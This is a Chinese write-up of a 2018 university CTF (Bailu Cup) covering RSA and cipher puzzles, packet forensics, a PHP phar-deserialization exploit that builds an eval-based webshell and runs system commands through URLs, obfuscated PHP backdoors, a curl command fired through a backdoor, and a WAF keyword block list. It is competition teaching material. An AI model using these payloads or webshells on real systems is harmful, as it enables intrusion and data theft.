247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 # b\u0026#39;ISEC{simp13_crypt0}\u0026#39; Crypto2 基因会突变，BASE64与Caesar也变异 加密密文: AUikzgRpLWaVIEaeKrqkJiieLhhqvf6= ​ 格式: ISEC{ }\n我好像不太懂╮(╯▽╰)╭\nCrypto3 problem 1 2 RSA(829467319, 48357) 322517722,575397051,76525646,768452152,107590034,710690594,322517722,174907762,343945760,763355610,301647581,349705569,575397051,76525646,410109929,322517722,497916224,228868281,228868281,741167939,497916224,450014050,322517722,322517722,126657310,349705569,322517722,707637171,76525646,527107437,710690594,685252839,450014050,349705569,388149253,710690594,763355610,211593791,707637171,369453331,228868281,541631545,397988536,322517722,12982396,107590034,387385119,322517722,685252839,710690594,322517722,109170298,349705569,763355610,349705569,349705569,37195518,25028382,610867628,44896265,25028382,454683367,15283689 solve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # -*- coding : utf-8 -*- # __author__ = \u0026#39;https://github.com/findneo\u0026#39; import gmpy2 n=829467319 # 使用yafu离线分解得到p,q p = 36497 q = 22727 e=48357 assert(p*q==n) phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) c=[322517722,575397051,76525646,768452152,107590034,710690594,322517722,174907762,343945760,763355610,301647581,349705569,575397051,76525646,410109929,322517722,497916224,228868281,228868281,741167939,497916224,450014050,322517722,322517722,126657310,349705569,322517722,707637171,76525646,527107437,710690594,685252839,450014050,349705569,388149253,710690594,763355610,211593791,707637171,369453331,228868281,541631545,397988536,322517722,12982396,107590034,387385119,322517722,685252839,710690594,322517722,109170298,349705569,763355610,349705569,349705569,37195518,25028382,610867628,44896265,25028382,454683367,15283689] s=\u0026#39;\u0026#39;.join(map(lambda ci:chr(pow(ci,d,n)),c)) print(s) # _stIwn_:!oAestN_rii.ra__}e_gt8nuae1nolg0iYf_2w{_un_CeoeeEhychST MISC MISC1 部分ICMP包DATA字段携带数据，且逐字节为504B\u0026hellip;，很显然是个压缩包，使用命令行工具tshark提取对应字段。\ntshark用法参考tshark --help 或 Wireshark命令行工具tshark使用小记 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ tshark -r pcapng.pcapng -Y \u0026#34;icmp and icmp.ident==0x930a\u0026#34; -T fields -e data | xxd -r -p \u0026gt; flag.zip \u0026amp;\u0026amp; xxd flag.zip 00000000: 504b 0304 1400 0100 0000 0386 584d 2a17 PK..........XM*. 00000010: fbf2 3200 0000 2600 0000 0800 0000 666c ..2...\u0026amp;.......fl 00000020: 6167 2e74 7874 c541 e340 943c a98d fc66 ag.txt.A.@.\u0026lt;...f 00000030: 952e 0ffe 9ff3 8797 7647 b934 6d3d 8d3d ........vG.4m=.= 00000040: b94c fc2d cb14 16f3 723a ab5c 5e7f 0903 .L.-....r:.\\^... 00000050: 64ea 7b5b 1ae0 1a4c 504b 0102 3f00 1400 d.{[...LPK..?... 00000060: 0100 0000 0386 584d 2a17 fbf2 3200 0000 ......XM*...2... 00000070: 2600 0000 0800 2400 0000 0000 0000 2000 \u0026amp;.....$....... . 00000080: 0000 0000 0000 666c 6167 2e74 7874 0a00 ......flag.txt.. 00000090: 2000 0000 0000 0100 1800 cee8 7c47 766b ...........|Gvk 000000a0: d401 7d2d ec42 766b d401 7d2d ec42 766b ..}-.Bvk..}-.Bvk 000000b0: d401 504b 0506 0000 0000 0100 0100 5a00 ..PK..........Z. 000000c0: 0000 5800 0000 0000 0050 ..X......P neo@u:/mnt/d/cwd/bailu/mis1$ 使用ziperello爆破密码为q，得到flag{d27ca49cb6f5583ae9f3bb2ec38190de} 。\nMISC2 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;safe box\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { text-align: center; } input { font-size: 200%; margin-top: 5em; text-align: center; width: 26em; } #result { margin-top: 8em; font-size: 300%; font-family: monospace; font-weight: bold; } body.granted\u0026gt;#result::before { content: \u0026#34;Access Granted\u0026#34;; color: green; } body.denied\u0026gt;#result::before { content: \u0026#34;Access Denied\u0026#34;; color: red; } #content { display: none; } body.granted #content { display: initial; } @keyframes spin { from { transform: rotateY(0); } to { transform: rotateY(360deg); } } .cube { animation: spin 20s infinite linear; } .cube div { position: absolute; width: 200px; height: 200px; background: rgba(0, 0, 0, 0.51); box-shadow: inset 0 0 60px white; font-size: 20px; text-align: center; line-height: 200px; color: rgba(0,0,0,0.5); font-family: sans-serif; text-transform: uppercase; } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; function adler32(str) { var a = 1, b = 0, L = str.length, M = 0, c = 0, d = 0; for (var i = 0; i \u0026lt; L;) { M = Math.min(L - i, 3850); while (M \u0026gt; 0) { c = str.charCodeAt(i++); if (c \u0026lt; 0x80) { a += c; } else if (c \u0026lt; 0x800) { a += 192 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 31); b += a; --M; a += 128 | (c \u0026amp; 63); } else if (c \u0026gt;= 0xD800 \u0026amp;\u0026amp; c \u0026lt; 0xE000) { c = (c \u0026amp; 1023) + 64; d = str.charCodeAt(i++) \u0026amp; 1023; a += 240 | ((c \u0026gt;\u0026gt; 8) \u0026amp; 7); b += a; --M; a += 128 | ((c \u0026gt;\u0026gt; 2) \u0026amp; 63); b += a; --M; a += 128 | ((d \u0026gt;\u0026gt; 6) \u0026amp; 15) | ((c \u0026amp; 3) \u0026lt;\u0026lt; 4); b += a; --M; a += 128 | (d \u0026amp; 63); } else { a += 224 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 15); b += a; --M; a += 128 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 63); b += a; --M; a += 128 | (c \u0026amp; 63); } b += a; --M; } a = (15 * (a \u0026gt;\u0026gt;\u0026gt; 16) + (a \u0026amp; 65535)); b = (15 * (b \u0026gt;\u0026gt;\u0026gt; 16) + (b \u0026amp; 65535)); } return ((b % 65521) \u0026lt;\u0026lt; 16) | (a % 65521); } function check(х){ if(х!=\u0026#34;0x0201\u0026#34;\u0026amp;\u0026amp;adler32(х)==adler32(\u0026#34;0x0201\u0026#34;)){ return true; } else{ return false; } } function open_safe() { keyhole.disabled = true; password = /^password{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value); if (!password || !check(password[1])) return document.body.className = \u0026#39;denied\u0026#39;; document.body.className = \u0026#39;granted\u0026#39;; content.value = \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x83\\x00\\x00\\x00N\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x00\\x06\\x05KP\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\x8d\\x03\\x00\\x05TUtxt.galf\\x00\\x00\\x00\\x00\\x81\\xa4\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x03\\x1e\\x02\\x01KP\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0c\\x08\\x07KP\\x045R\\tM\\xc2\\xde\\x14sg\\x92\\xd0K\\xbfh\\x9c\\x08\\xeb\\xf3@\\x9d\\x00\\x14\\x8b^\\xfb\\xa5\\x96O\\xc0\\xdd\\x8a(\\xe6\\x0c\\x92\\x1e \\xad\\x86\\xa6@\\xbc@J=\\x11Z\\xfe\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\xfb[\\xd1\\x9e\\x8d\\x03\\x00\\tTUtxt.galf\\x00\\x1c\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x04\\x03KP\u0026#34;; } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;input id=\u0026#34;keyhole\u0026#34; autofocus onchange=\u0026#34;open_safe()\u0026#34; placeholder=\u0026#34;🔑\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;input id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; solve 显然密码正确后输出的conten.value是一个压缩包反转后的内容，提取得到压缩包发现加密，猜测密码要能走通JS逻辑。\n1 2 s=\u0026#34;\\x00\\x00\\x00\\x00\\x00\\x83\\x00\\x00\\x00N\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x00\\x06\\x05KP\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\x8d\\x03\\x00\\x05TUtxt.galf\\x00\\x00\\x00\\x00\\x81\\xa4\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x03\\x1e\\x02\\x01KP\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0c\\x08\\x07KP\\x045R\\tM\\xc2\\xde\\x14sg\\x92\\xd0K\\xbfh\\x9c\\x08\\xeb\\xf3@\\x9d\\x00\\x14\\x8b^\\xfb\\xa5\\x96O\\xc0\\xdd\\x8a(\\xe6\\x0c\\x92\\x1e \\xad\\x86\\xa6@\\xbc@J=\\x11Z\\xfe\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\xfb[\\xd1\\x9e\\x8d\\x03\\x00\\tTUtxt.galf\\x00\\x1c\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x04\\x03KP\u0026#34; f=open(\u0026#39;extract.zip\u0026#39;,\u0026#39;wb\u0026#39;).write(s[::-1]) 使用JavaScript爆破密码：\n1 2 3 4 5 6 7 8 9 10 11 function dec2hexString(dec) { return \u0026#39;0x\u0026#39; + (dec+0x10000).toString(16).substr(-4).toUpperCase(); } function bruteforce(){ for(var i = 0;i\u0026lt;0xffff;i++){ if(check(dec2hexString(i)))console.log(\u0026#34;password{\u0026#34;+dec2hexString(i)+\u0026#34;}\u0026#34;) } } bruteforce() // password{0x0120} √ // password{0x1011} × 或者使用python爆破：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # /^password{([0-9a-zA-Z_@!?-]+)}$/ def adler32(s): i=0;a=1;b=0;M=0;c=0;d=0 while i\u0026lt;len(s): M=min(len(s)-i,3850) while M\u0026gt;0: c=ord(s[i]);i+=1 if c\u0026lt; 0x80: a+=c elif c\u0026gt;0xd800 and c \u0026lt; 0xe000: c= (c \u0026amp; 1023) +64 ;d = s[i]\u0026amp;1023;i+=1 a+=240 | ((c \u0026gt;\u0026gt; 8) \u0026amp; 7); b += a; M-=1 a += 128 | ((c \u0026gt;\u0026gt; 2) \u0026amp; 63); b += a; M-=1 a += 128 | ((d \u0026gt;\u0026gt; 6) \u0026amp; 15) | ((c \u0026amp; 3) \u0026lt;\u0026lt; 4); b += a; M-=1 a += 128 | (d \u0026amp; 63) else: a += 224 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 15); b += a;M-=1 a += 128 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 63); b += a;M-=1 a += 128 | (c \u0026amp; 63) b+=a;M-=1 a = (15 * (a \u0026gt;\u0026gt; 16) + (a \u0026amp; 65535)) b = (15 * (b \u0026gt;\u0026gt; 16) + (b \u0026amp; 65535)) return ((b % 65521) \u0026lt;\u0026lt; 16) | (a % 65521) import itertools for i in itertools.product(\u0026#39;0123456789\u0026#39;,repeat=4): p=\u0026#39;0x\u0026#39;+\u0026#39;\u0026#39;.join(i) if adler32(p)==adler32(\u0026#39;0x0201\u0026#39;): print p, # [0x0120] 0x0201 0x1011 密码为password{0x0120} ，解压得到flag。flag{cjvf33_98hfi3_jfh3_dsh93h_f3had} 。\nMISC3 给了1321个TXT，每个文件一个字符，内容如下。提示时间戳，没搞懂要干啥。\n1 2 $ cat ./* Money is not evil by itself.Its just paper with perceived value to obtain other things we value in other ways.If not money - what is. evil you may ask?Evil is the unquenchable, obsessive and moral bending desire for more.Evil is the bottomless, soulless and obsessive-compulsive pursuit of some pot of gold.at the end of some rainbow which doesn\u0026#39;t exist.Evil is having a price tag for your heart and soul in exchange for financial success at any cost.Evil is trying to buy happiness, again and again.until all of those fake, short lived mirages of emotions are gone.Make more time.I\u0026#39;m not saying you can\u0026#39;t be financially successful.I\u0026#39;m saying have a greater purpose in life well beyond the pursuit of financial success.Your soul is screaming for you to answer your true calling.You can change today if you redefine what success is to you.You can transform your damaged relationships and build new ones.You can forgive yourself and others who\u0026#39;ve hurt you.You can become a leader by mentoring with others who you aspire to be like.You can re-balance your priorities in life.You can heal your marriage and recreate a stronger love than you ever thought possible.You can become the best parent possible at any age - even 86.but don\u0026#39;t wait until then...You will always be able to make more money.But you cannot make more time. 记录一个获取文件时间的方式。\n1 2 import subprocess a=subprocess.check_output((\u0026#34;stat\u0026#34;,\u0026#34;-c\u0026#34;, \u0026#34;%y\u0026#34;, file_name)) Web Web1 万能密码\nWeb2 主页CTRL+U，发现源码泄露。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //http://172.16.17.2/file_aq12ws.php \u0026lt;?php if(isset($_GET[\u0026#39;filename\u0026#39;])){ $filename=$_GET[\u0026#39;filename\u0026#39;]; class MyClass{ var $output = \u0026#39;echo \u0026#34;hahaha\u0026#34;;\u0026#39;; function __destruct() { eval($this -\u0026gt; output); } } file_exists($filename); } else{ highlight_file(__FILE__); } 这是前段时间black hat上提到的利用phar伪协议在一些文件系统函数中触发反序列化漏洞。\nphar文件本质上是一个压缩文件，在manifest部分存放每个被压缩文件的权限、属性等信息和用户自定义的meta-data数据，后者是以序列化后的形式存在的。而PHP中大部分文件系统函数在通过 phar:// 伪协议解析phar文件时，都会将meta-data反序列化。因此就有了本题的反序列化触发点file_exists函数。除了file_exists还有下图所示的函数，详见 利用 phar 拓展 php 反序列化漏洞攻击面 。\n所以本题的思路是先生成一个meta-data中包含恶意object的phar文件，然后通过上传点上传该文件得到路径，再在 file_aq12ws.php 通过filename参数以phar:// 方式包含该文件，就将在file_exists函数处触发phar文件的meta-data的反序列化，就可以得到一个web shell。\n要生成phar文件，需要 phar.readonly 为Off，即值为0。而出于安全性考虑，该项默认使能，值为1。当php.ini文件中的phar.readonly值为0时，可以使用ini_set在脚本中设为1或0；当值为1时，只能通过修改php.ini文件来修改值而不能通过脚本修改。也就是说，我们需要在生成phar文件前修改php.ini中phar.readonly值的Off。详细说明见 文档 。\n生成phar包的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php class MyClass{ var $output = \u0026#39;@eval($_GET[\u0026#34;cmd\u0026#34;]);\u0026#39;; function __destruct() { eval($this -\u0026gt; output); } } $evil_object=new MyClass();//生成恶意对象 $file_name=\u0026#34;test.phar\u0026#34;;//后缀必须为phar if(file_exists($file_name))unlink(\u0026#39;test.phar\u0026#39;);//删除当前目录下已有的phar包 $phar=new Phar($file_name); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;);//设置stub，可理解为phar文件的标志 $phar-\u0026gt;setMetadata($evil_object);//将恶意对象作为自定义的meta-data传入manifest $phar-\u0026gt;addFromString(\u0026#34;foo.txt\u0026#34;,\u0026#34;bar\u0026#34;);//添加压缩文件及其内容 $phar-\u0026gt;stopBuffering(); 访问该代码后目录下会生成test.phar 文件，重命名为test.gif ，上传后访问 target.ip/file_aq12ws.php?filename=phar://test.gif\u0026amp;cmd=phpinfo(); 见到phpinfo页面就说明成功了。\n1 2 3 4 5 6 7 8 9 10 11 12 $ xxd test.phar 00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d \u0026lt;?php __HALT_COM 00000010: 5049 4c45 5228 293b 203f 3e0d 0a70 0000 PILER(); ?\u0026gt;..p.. 00000020: 0001 0000 0011 0000 0001 0000 0000 003b ...............; 00000030: 0000 004f 3a37 3a22 4d79 436c 6173 7322 ...O:7:\u0026#34;MyClass\u0026#34; 00000040: 3a31 3a7b 733a 363a 226f 7574 7075 7422 :1:{s:6:\u0026#34;output\u0026#34; 00000050: 3b73 3a32 303a 2240 6576 616c 2824 5f47 ;s:20:\u0026#34;@eval($_G 00000060: 4554 5b22 636d 6422 5d29 3b22 3b7d 0700 ET[\u0026#34;cmd\u0026#34;]);\u0026#34;;}.. 00000070: 0000 666f 6f2e 7478 7403 0000 000a 5ffb ..foo.txt....._. 00000080: 5b03 0000 00aa 8cff 76b6 0100 0000 0000 [.......v....... 00000090: 0062 6172 7533 2162 c819 a6d5 6019 ab22 .baru3!b....`..\u0026#34; 000000a0: 7e2e f1df 96d7 b375 0200 0000 4742 4d42 ~......u....GBMB 1 2 3 http://172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif\u0026amp;a=system(\u0026#39;find / | grep flag\u0026#39;); http://172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif\u0026amp;a=system(\u0026#39;cat /var/www/html/sdf3r_df3erdf/flag.txt\u0026#39;); flag{qwe3_89fdsf3_jjnj3ioxc_ozxov} AWD Web attack\n一上来D盾扫出几个后门。用其中一个连了菜刀，在E:\\wwwroot\\RequestFlag\\ 发现url.bat ，内容为：curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key ，在目标机上执行该命令可以得到对方flag。\n1 curl \u0026#34;http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php\u0026#34; -d \u0026#34;-7=system(\u0026#39;E:\\wwwroot\\RequestFlag\\curl.exe https://FlagServer.com:9000/flag --cacert E:\\wwwroot\\RequestFlag\\ca.crt --cert E:\\wwwroot\\RequestFlag\\client.crt --key E:\\wwwroot\\RequestFlag\\client.key\u0026#39;);\u0026#34; 用的木马是wwwroot\\wordpress\\wp-includes\\customize\\class-wp-customize-background-image-list.php ，相当于@assert(${_POST}[-7]); 。\n1 2 3 4 5 \u0026lt;?php @$_ = \u0026#34;s\u0026#34; . \u0026#34;s\u0026#34; . /*-/*-*/\u0026#34;e\u0026#34; . /*-/*-*/\u0026#34;r\u0026#34;; @$_ = /*-/*-*/\u0026#34;a\u0026#34; . /*-/*-*/$_ . /*-/*-*/\u0026#34;t\u0026#34;; @$_/*-/*-*/($/*-/*-*/{\u0026#34;_P\u0026#34; . /*-/*-*/\u0026#34;OS\u0026#34; . /*-/*-*/\u0026#34;T\u0026#34;} [/*-/*-*/0/*-/*-*/ - /*-/*-*/2/*-/*-*/ - /*-/*-*/5/*-/*-*/]); 在WAF上配了一些敏感字符正则后观察日志，发现另一个大家用的比较多的后门，wwwroot\\wordpress\\wp-includes\\pomo\\tp.php ，等价于@ASsERT(eval(@$_POST[cmd])); 。\n1 2 3 \u0026lt;?php ${(\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;)} = (\u0026#34;!\u0026#34; ^ \u0026#34;`\u0026#34;) . (\u0026#34;( \u0026#34; ^ \u0026#34;{\u0026#34;) . (\u0026#34;(\u0026#34; ^ \u0026#34;[\u0026#34;) . (\u0026#34;~\u0026#34; ^ \u0026#34;;\u0026#34;) . (\u0026#34;|\u0026#34; ^ \u0026#34;.\u0026#34;) . (\u0026#34;*\u0026#34; ^ \u0026#34;~\u0026#34;); @${(\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;|\u0026#34;)}((\u0026#34;-\u0026#34; ^ \u0026#34;H\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;+\u0026#34;) . (\u0026#34;[\u0026#34; ^ \u0026#34;:\u0026#34;) . (\u0026#34;,\u0026#34; ^ \u0026#34;@\u0026#34;) . (\u0026#34;}\u0026#34; ^ \u0026#34;U\u0026#34;) . (\u0026#34;~\u0026#34; ^ \u0026#34;\u0026gt;\u0026#34;) . (\u0026#34;e\u0026#34; ^ \u0026#34;A\u0026#34;) . (\u0026#34;(\u0026#34; ^ \u0026#34;w\u0026#34;) . (\u0026#34;j\u0026#34; ^ \u0026#34;:\u0026#34;) . (\u0026#34;i\u0026#34; ^ \u0026#34;\u0026amp;\u0026#34;) . (\u0026#34;#\u0026#34; ^ \u0026#34;p\u0026#34;) . (\u0026#34;\u0026gt;\u0026#34; ^ \u0026#34;j\u0026#34;) . (\u0026#34;!\u0026#34; ^ \u0026#34;z\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;\u0026gt;\u0026#34;) . (\u0026#34;@\u0026#34; ^ \u0026#34;-\u0026#34;) . (\u0026#34;[\u0026#34; ^ \u0026#34;?\u0026#34;) . (\u0026#34;?\u0026#34; ^ \u0026#34;b\u0026#34;) . (\u0026#34;]\u0026#34; ^ \u0026#34;t\u0026#34;)); 后来发现两处文件包含。可以利用./ 和../ 分隔关键字绕过WAF，因为醒悟的比较晚和自动化做得不够方便，这个没有发挥太大作用。\nwwwroot\\wordpress\\wp-content\\plugins\\localize-my-post\\ajax\\include.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php //Include WP base to have the basic WP functions include_once($_SERVER[\u0026#39;DOCUMENT_ROOT\u0026#39;] . \u0026#34;/wp-blog-header.php\u0026#34;); //Set status 200 header //Include requested file if it exists if(isset($_REQUEST[\u0026#39;file\u0026#39;])){ $file=$_REQUEST[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#39;./\u0026#39;,\u0026#39;\u0026#39;,$file); header(\u0026#39;HTTP/1.1 200 OK\u0026#39;); include($file); } 和 wwwroot\\wordpress\\wp-content\\plugins\\site-editor\\editor\\extensions\\pagebuilder\\includes\\ajax_shortcode_pattern.php\n1 2 3 4 5 6 7 8 \u0026lt;?php if( isset( $_REQUEST[\u0026#39;ajax_path\u0026#39;] ) ){ $ajax_path=$_REQUEST[\u0026#39;ajax_path\u0026#39;]; $ajax_path = str_replace(\u0026#39;../\u0026#39;,\u0026#39;\u0026#39;,$ajax_path); require_once $ajax_path; } ... 此外，有些队伍过滤了system，exe等关键字，采用反引号，base64编码，rot13编码等尝试绕过。\n也许因为check机制不好使，某个时间开始大约一半以上的队伍选择关站保平安，即使只是访问对方主页也会被WAF拦截。这不难实现，只要在WAF里面把IP当关键字过滤掉就可以。这大概不太厚道吧，但黑客嘛，也许就是理解并打击规则？\n没挖出啥洞，我好菜啊。而且WAF这么强，挖出来也用不上吧。\ndefense\n一开始就在WAF上把D盾扫出来的几个可疑文件加入黑名单，后来又配了敏感关键字exec|system|exe|curl|flag|base64|filter|cmd|-7|{|rot13 等，所以Web基本只在刚开始的几轮失分。\n全程就是每轮打一下，看看WAF有没拦到有趣的东西，挣扎着试图挖到洞，以及尝试一些绕过关键字的方法。\nPWN attack\n因为Web手比较菜:(，PWN手帮忙看了半天Web，开始搞PWN的时间比较晚，心态有点崩，最后思路来得晚，全程没打出分，很可惜。也许后面研究下王博的WP再复现一下。\ndefense\n权限问题动不了PWN文件，patch无门，基本坐着挨打。同样可能因为check机制的问题，存在一个fork炸弹躺下装死的防御思路。\n挨打要立正 拿到两个第二确实是赛前没想到的，但这改变不了我菜的本质。队友们虽然比我强，但是也依然有很大进步空间，包括更扎实的基础，更熟练的操作，更灵活的思路，更默契的配合等等。\n第一天突围赛刚开始比较顺利，最后五分钟被夜影师傅所在队伍反超，放上他们的逆向writeup：181124 逆向-2018“柏鹭杯”厦大邀请赛初赛（Re1、2） ，以弥补本文不足。\n第二天AWD则全程被北航吊打，伏地膜。\n因为看到某群里有人吐槽这是垃圾比赛，我觉得这个说法不太负责任，所以作为厦大学生多说两句。从题目来说。crypto一题有点脑洞，一题简单，一题中等，可以接受，misc也是相对合格的，Web题思路清晰，也有有趣的东西。reverse，PWN中也不乏质量不错的题，做出题的师傅也是认可其有自己特点的。\n除了题目，比赛奖金也是很高的，闭幕式到场的嘉宾也是够级别的，比赛环境可以说相当不错，住宿交通也很人性化。从各个角度来说，这都可以算是一场有诚意的，有愿望办好且确实做得不错的比赛。所以不管是因为没被邀请、做不出题、确实感觉题目质量不行、现场厕所不够用、志愿者里面漂亮小姐姐不够多还是其他什么原因而觉得不爽的，吐槽时把话说清楚还是比较好的，免得引起不必要的误解。明年应该还会举办，欢迎路过的大佬来玩。\n当然，要改进的东西还是蛮多的，反思不应该由我来做，简单说点自己的感受。最不理想的大概是AWD的check，这个称为健康检查的东西好像分不清怎样是健康。其次是使用WAF作为Web防守的工具固然可以让即使是像我这样的AWD经验不足的选手都可以很舒服，也减轻维护压力，但这样是没法打出刺激的AWD的，再加上check和我一样菜，除了没搞清楚状况的选手，有坚定原则的选手，很可能出现全场全线WAF，那就没啥好打的了。最后是PWN没有给选手patch的权限，这是不太正常的，直接导致最好的防护是把自己搞down，不管主办方是出于维护难度考虑还是什么，对真正有能力且想打一场有意思的比赛的选手来说游戏体验是不太好的。所以如果揪住这几点发表比较严厉的批评的话我是没话说的😔\n最后，感谢队友带飞。\n","permalink":"https://ret2neo.cn/post/181125-bailucup-writeup/","summary":"CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1\u0026lt;\u0026lt;3071,1\u0026lt;\u0026lt;3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print csolve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ncimport gmpy2 from Crypto.","title":"2018 柏鹭杯 